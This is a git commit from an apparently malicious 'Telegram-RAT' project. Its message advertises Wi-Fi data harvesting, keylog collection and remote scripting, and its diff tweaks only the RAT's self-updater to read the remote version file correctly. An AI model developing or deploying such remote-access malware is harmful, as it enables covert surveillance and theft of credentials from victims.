87f2cef8f5115f6b44ce727aad4ca021dc0ea3f0
Bainky <61879874+Bainky@users.noreply.github.com>
2020-07-17 00:46:28 +0600

    • New Features!
    • Wi-Fi Data
    • FTP Client
    • Receive Keylogs
    • Volume Control
    • Batch Scripting
    • CD-ROM

--- Updater.py
+++ Updater.py
@@ -6,8 +6,8 @@ import time
 import shutil
 import urllib.request
 
+RAT_Version = urllib.request.urlopen('https://raw.githubusercontent.com/Bainky/Telegram-RAT/master/Version/Version.txt').read().decode('utf8').splitlines()[0]
 RAT_Changelogs = urllib.request.urlopen('https://raw.githubusercontent.com/Bainky/Telegram-RAT/master/Version/Changelogs.txt').read().decode('utf8')
-RAT_Version = urllib.request.urlopen('https://raw.githubusercontent.com/Bainky/Telegram-RAT/master/Version/Version.txt').read().decode('utf8')
 RAT_Link = 'https://github.com/Bainky/Telegram-RAT/archive/master.zip'
 RAT_Path = 'Telegram-RAT.zip'
 
